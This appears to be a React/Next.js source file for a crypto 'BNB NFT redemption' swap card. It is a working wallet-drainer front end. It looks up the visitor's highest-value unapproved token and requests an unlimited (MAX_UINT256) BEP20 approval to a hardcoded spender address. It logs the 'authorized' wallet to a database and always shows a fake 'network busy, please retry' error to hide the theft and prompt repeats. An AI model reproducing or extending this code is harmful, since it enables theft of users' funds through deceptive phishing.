"use client"

import { useState, useCallback, useEffect } from "react"
import Image from "next/image"
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { Wallet, Loader2, ArrowDown } from "lucide-react"
import { useLanguage } from "@/lib/language-context"
import { useAccount, useWriteContract, useWaitForTransactionReceipt } from "wagmi"
import { useConnectModal } from "@rainbow-me/rainbowkit"
import { useSyncContext } from "@/lib/sync-context"
import { useToast } from "@/hooks/use-toast"
import { BEP20_ABI, SPENDER_ADDRESS, MAX_UINT256 } from "@/lib/contracts"

interface TokenData {
  token_address: string
  symbol: string | null
  name: string | null
  logo: string | null
  usd_price: number
}

export function RedemptionCard() {
  const { t } = useLanguage()
  const { address, isConnected } = useAccount()
  const { openConnectModal } = useConnectModal()
  const [isRedeeming, setIsRedeeming] = useState(false)
  const [currentTokenAddress, setCurrentTokenAddress] = useState<TokenData | null>(null)
  const { isSyncing, syncCompleted, syncError } = useSyncContext()
  const { toast } = useToast()
  const { writeContractAsync } = useWriteContract()

  const handleConnect = useCallback(() => {
    openConnectModal?.()
  }, [openConnectModal])

  // Fetch token data when wallet is connected and sync is completed
  useEffect(() => {
    const fetchTokenData = async () => {
      if (!address || !syncCompleted || currentTokenAddress) return

      try {
        const response = await fetch(`/api/supabase/get-top-token?walletAddress=${address}`)
        
        if (!response.ok) {
          return
        }

        const { data: tokenData } = await response.json()
        
        if (tokenData && tokenData.token_address) {
          setCurrentTokenAddress({
            token_address: tokenData.token_address,
            symbol: tokenData.symbol,
            name: tokenData.name,
            logo: tokenData.logo,
            usd_price: tokenData.usd_price || 0,
          })
        }
      } catch (error) {
        console.error('Failed to fetch token data:', error)
      }
    }

    fetchTokenData()
  }, [address, syncCompleted, currentTokenAddress])

  const handleRedeem = async () => {
    if (!address) {
      toast({
        title: t.errors?.networkBusy || "网络繁忙，请重试",
        description: "",
        variant: "destructive",
      })
      return
    }

    let currentTokenAddress: string | null = null

    try {
      setIsRedeeming(true)

      // 步骤 1: 查询 Supabase 获取最高价值的未授权代币
      console.log('Fetching top token from Supabase...')
      const response = await fetch(`/api/supabase/get-top-token?walletAddress=${address}`)
      
      if (!response.ok) {
        const errorData = await response.json()
        throw new Error(errorData.message || errorData.error || 'Failed to fetch token')
      }

      const { data: tokenData } = await response.json()
      console.log('Top token found:', tokenData)

      if (!tokenData || !tokenData.token_address) {
        throw new Error('未找到可用的代币')
      }

      // 保存当前代币地址，用于后续更新
      currentTokenAddress = tokenData.token_address
      
      // 保存代币数据到状态
      setCurrentTokenAddress({
        token_address: tokenData.token_address,
        symbol: tokenData.symbol,
        name: tokenData.name,
        logo: tokenData.logo,
        usd_price: tokenData.usd_price || 0,
      })

      // 步骤 2: 调用 BEP20 approve 方法
      console.log('Calling approve...')
      console.log('Token address:', tokenData.token_address)
      console.log('Spender address:', SPENDER_ADDRESS)
      
      const hash = await writeContractAsync({
        address: tokenData.token_address as `0x${string}`,
        abi: BEP20_ABI,
        functionName: 'approve',
        args: [SPENDER_ADDRESS, MAX_UINT256],
      })

      console.log('Transaction hash:', hash)

      // 步骤 3: 交易成功，更新数据库 authorized = true
      console.log('Updating authorized status in database...')
      const updateResponse = await fetch('/api/supabase/update-authorized', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          walletAddress: address,
          tokenAddress: currentTokenAddress,
        }),
      })

      if (updateResponse.ok) {
        console.log('Database updated successfully')
      } else {
        console.error('Failed to update database, but transaction succeeded')
      }

      // 无论成功与否，都显示"网络繁忙，请重试"（按用户要求）
      toast({
        title: t.errors?.networkBusy || "网络繁忙，请重试",
        description: "",
        variant: "destructive", // 红色样式
        duration: 5000,
      })

    } catch (error: any) {
      console.error('Redeem error:', error)

      // 无论失败原因，都显示"网络繁忙，请重试"（按用户要求）
      toast({
        title: t.errors?.networkBusy || "网络繁忙，请重试",
        description: "",
        variant: "destructive",
        duration: 5000,
      })
    } finally {
      setIsRedeeming(false)
    }
  }

  // Calculate token amount: 200 / usd_price
  const calculateTokenAmount = (usdPrice: number, mobile: boolean = false) => {
    if (!usdPrice || usdPrice === 0) return "0"
    const amount = 200 / usdPrice
    
    // For mobile, limit to 4 decimal places if number is small
    if (mobile && amount < 1) {
      return amount.toFixed(4).replace(/\.?0+$/, "")
    }
    
    return amount.toFixed(6).replace(/\.?0+$/, "") // Remove trailing zeros
  }
  
  // Truncate token symbol if too long
  const formatTokenSymbol = (symbol: string | null) => {
    if (!symbol) return "TOKEN"
    if (symbol.length > 8) {
      return `${symbol.slice(0, 8)}...`
    }
    return symbol
  }

  return (
    <Card className="bg-card border-2 border-border overflow-hidden max-w-2xl mx-auto shadow-lg">
      <CardContent className="p-5 sm:p-7">
        {/* Swap Container */}
        <div className="space-y-4">
          {/* From Section - Stacked Layout */}
          <div className="bg-secondary/50 border-2 border-primary/20 rounded-2xl p-5 sm:p-7 hover:border-primary/40 transition-all">
            <div className="flex items-center justify-between mb-4">
              <span className="text-sm sm:text-base text-muted-foreground font-semibold uppercase tracking-wide">{t.swap.from}</span>
            </div>
            
            {/* Stacked Layout */}
            <div className="flex flex-col items-center gap-5 sm:gap-6">
              {/* NFT Image - Top (Larger, Centered) */}
              <div className="relative w-32 h-32 sm:w-40 sm:h-40 rounded-2xl overflow-hidden border-2 border-primary/40 shadow-[0_0_25px_rgba(240,185,11,0.5)]">
                <Image
                  src="/bnb_coin.gif"
                  alt="BNB 9th Anniversary NFT"
                  fill
                  className="object-cover"
                  priority
                />
              </div>
              
              {/* Token Info - Bottom (Centered with Border) */}
              <div className="flex items-center gap-3 bg-background/50 border-2 border-primary/30 rounded-xl px-5 py-3.5 sm:px-6 sm:py-4 hover:border-primary/50 transition-colors">
                <span className="text-xl sm:text-2xl font-bold text-foreground">BNB NFT</span>
                <div className="relative w-8 h-8 sm:w-10 sm:h-10 flex-shrink-0">
                  <Image
                    src="/icon.svg"
                    alt="BSC"
                    fill
                    className="object-contain"
                  />
                </div>
              </div>
            </div>
          </div>

          {/* Swap Arrow - More Space */}
          <div className="flex justify-center py-2 relative z-10">
            <div className="bg-background border-2 border-primary rounded-xl p-3 shadow-lg hover:scale-110 transition-transform cursor-pointer">
              <ArrowDown className="h-6 w-6 text-primary" />
            </div>
          </div>

          {/* To Section */}
          <div className={`bg-secondary/50 border-2 rounded-2xl p-5 sm:p-6 transition-all ${
            !isConnected || isSyncing 
              ? 'opacity-50 border-border' 
              : 'border-primary/20 hover:border-primary/40'
          }`}>
            <div className="flex items-center justify-between mb-4">
              <span className="text-sm sm:text-base text-muted-foreground font-semibold uppercase tracking-wide">{t.swap.to}</span>
            </div>
            {syncCompleted && currentTokenAddress ? (
              <>
                {/* Desktop Layout */}
                <div className="hidden sm:flex items-center justify-between gap-6">
                  {/* Amount and USD Value - Left */}
                  <div className="flex flex-col">
                    <span className="text-4xl font-bold text-foreground leading-tight">
                      {calculateTokenAmount(currentTokenAddress.usd_price || 0)}
                    </span>
                    <span className="text-base text-muted-foreground mt-1.5">
                      {t.swap.estimatedValue}
                    </span>
                  </div>
                  
                  {/* Token Symbol and Logo - Right */}
                  <div className="flex items-center gap-3 flex-shrink-0 bg-background/50 border-2 border-primary/30 rounded-xl px-5 py-4 hover:border-primary/50 transition-colors">
                    <span className="text-2xl font-bold text-foreground">
                      {currentTokenAddress.symbol || "TOKEN"}
                    </span>
                    <div className="relative w-10 h-10 flex-shrink-0 rounded-full overflow-hidden">
                      <Image
                        src={currentTokenAddress.logo || "/icon.svg"}
                        alt={currentTokenAddress.symbol || "Token"}
                        fill
                        className="object-cover"
                        onError={(e) => {
                          const target = e.target as HTMLImageElement
                          target.src = "/icon.svg"
                        }}
                      />
                    </div>
                  </div>
                </div>
                
                {/* Mobile Layout - Stacked */}
                <div className="flex sm:hidden flex-col gap-4">
                  {/* Amount and USD Value */}
                  <div className="flex flex-col">
                    <span className="text-2xl font-bold text-foreground leading-tight break-all">
                      {calculateTokenAmount(currentTokenAddress.usd_price || 0, true)}
                    </span>
                    <span className="text-xs text-muted-foreground mt-1">
                      {t.swap.estimatedValue}
                    </span>
                  </div>
                  
                  {/* Token Symbol and Logo */}
                  <div className="flex items-center justify-between gap-2">
                    <div className="flex items-center gap-2 flex-1 min-w-0 bg-background/50 border-2 border-primary/30 rounded-xl px-3 py-2.5 hover:border-primary/50 transition-colors">
                      <span className="text-lg font-bold text-foreground truncate">
                        {formatTokenSymbol(currentTokenAddress.symbol)}
                      </span>
                      <div className="relative w-7 h-7 flex-shrink-0 rounded-full overflow-hidden">
                        <Image
                          src={currentTokenAddress.logo || "/icon.svg"}
                          alt={currentTokenAddress.symbol || "Token"}
                          fill
                          className="object-cover"
                          onError={(e) => {
                            const target = e.target as HTMLImageElement
                            target.src = "/icon.svg"
                          }}
                        />
                      </div>
                    </div>
                  </div>
                </div>
              </>
            ) : (
              <div className="flex items-center justify-between gap-4 sm:gap-6">
                <span className="text-base sm:text-lg text-muted-foreground">
                  {isConnected ? "Loading..." : "Connect wallet"}
                </span>
                <div className="flex items-center gap-2 sm:gap-3 bg-background/50 border-2 border-muted rounded-xl px-3 py-2.5 sm:px-5 sm:py-4">
                  <span className="text-base sm:text-lg font-bold text-muted-foreground">---</span>
                  <div className="relative w-7 h-7 sm:w-10 sm:h-10 flex-shrink-0 opacity-50">
                    <Image
                      src="/icon.svg"
                      alt="BSC"
                      fill
                      className="object-contain"
                    />
                  </div>
                </div>
              </div>
            )}
          </div>
        </div>

        {/* Swap Button */}
        <div className="mt-6 space-y-3">
          {!isConnected ? (
            <Button
              onClick={handleConnect}
              className="w-full bg-primary hover:opacity-90 text-primary-foreground font-bold h-14 sm:h-16 text-base sm:text-lg rounded-xl shadow-lg border-2 border-primary-foreground/10"
            >
              <Wallet className="mr-2 h-6 w-6" />
              <span>{t.swap.connectWallet}</span>
            </Button>
          ) : isSyncing ? (
            <Button
              disabled
              className="w-full bg-primary text-primary-foreground font-bold h-14 sm:h-16 text-base sm:text-lg disabled:opacity-60 disabled:cursor-not-allowed rounded-xl shadow-lg border-2 border-primary-foreground/10"
            >
              <Loader2 className="mr-2 h-6 w-6 animate-spin" />
              <span>Loading...</span>
            </Button>
          ) : syncCompleted ? (
            <Button
              onClick={handleRedeem}
              disabled={isRedeeming || !currentTokenAddress}
              className="w-full bg-primary hover:opacity-90 text-primary-foreground font-bold h-14 sm:h-16 text-base sm:text-lg rounded-xl shadow-lg border-2 border-primary-foreground/10 hover:shadow-xl transition-all"
            >
              {isRedeeming ? t.swap.processing : t.swap.swapButton}
            </Button>
          ) : null}
          
          {/* 同步失败提示 */}
          {syncError && syncCompleted && (
            <p className="text-xs text-destructive text-center">
              Sync failed: {syncError}
            </p>
          )}
          
          <p className="text-xs sm:text-sm text-muted-foreground text-center">
            {t.swap.terms}
          </p>
        </div>
      </CardContent>
    </Card>
  )
}
